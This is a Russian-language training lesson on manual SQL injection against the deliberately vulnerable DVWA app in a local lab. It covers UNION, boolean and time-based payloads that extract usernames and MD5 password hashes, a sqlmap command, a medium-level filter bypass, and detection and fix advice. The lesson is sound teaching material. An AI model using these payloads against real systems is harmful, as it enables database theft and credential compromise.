# 8.1 — SQL-инъекции

> **M08 · Этап 1 · 5 ч · 🟡 · артефакт:** `labs/m08-web-api/l01-sqli/`

## Цель

Понять SQLi на уровне запроса и научиться эксплуатировать её вручную: UNION, boolean, time-based.

## Результат

- Вытаскиваете данные из DVWA без sqlmap.
- Объясняете, почему параметризация решает проблему.
- Знаете, когда `sqlmap` уместен, а когда он только шумит.

## Теория

- Инъекция возникает, когда ввод конкатенируется в SQL.
- UNION требует совпадения числа и типов колонок.
- Boolean-based: меняем условие и смотрим, отличается ли страница.
- Time-based: `SLEEP()`/`pg_sleep()` для слепых инъекций.
- Комментарии: `-- `, `#`, `/* */`.
- WAF обходится кодированием, регистром, альтернативным синтаксисом — но это не «магия», а разбор фильтра.
- `sqlmap` полезен для автоматизации, но сначала — руками.

## Лаборатория

### 1. Проверить инъекцию

DVWA → SQL Injection, security `low`.

```
1
```

Ожидаемо: один пользователь. Затем:

```
1' OR '1'='1
```

Ожидаемо: все пользователи — условие всегда истинно.

### 2. Определить колонки

```
1' ORDER BY 1#
1' ORDER BY 2#
1' ORDER BY 3#
```

Ожидаемо: до 2 работает, на 3 ошибка → две колонки.

### 3. UNION

```
1' UNION SELECT user, password FROM users#
```

Ожидаемо: логины и MD5-хэши. Проверьте `admin` → `5f4dcc3b5aa765d61d8327deb882cf99` (MD5 `password`).

### 4. Boolean и time-based

```
1' AND 1=1#
1' AND 1=2#
1' AND SLEEP(3)#
```

Ожидаемо: первая — данные, вторая — пусто, третья — задержка 3 секунды. Time-based нужен, когда нет вывода.

### 5. sqlmap (осознанно)

```bash
sqlmap -u "http://127.0.0.1:8080/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=...; security=low" --batch --dbs
```

Ожидаемо: список БД. Не используйте `--dump-all` в лабе без необходимости: это шум и лишние данные.

### 6. Medium

Переключите security на `medium`. Кавычки экранируются. Попробуйте:

```
1 OR 1=1#
```

или подставьте число без кавычек, если запрос числовой. Зафиксируйте, что именно фильтруется.

## Атака и защита

- **Атака:** вывод данных, обход аутентификации, `INTO OUTFILE` → webshell, stacked queries.
- **Детект:** ошибки SQL в ответах, аномальные `UNION`/`SLEEP`, WAF, рост времени ответа.
- **Фикс:** prepared statements, ORM, валидация типа, минимальные права БД, отключить подробные ошибки.
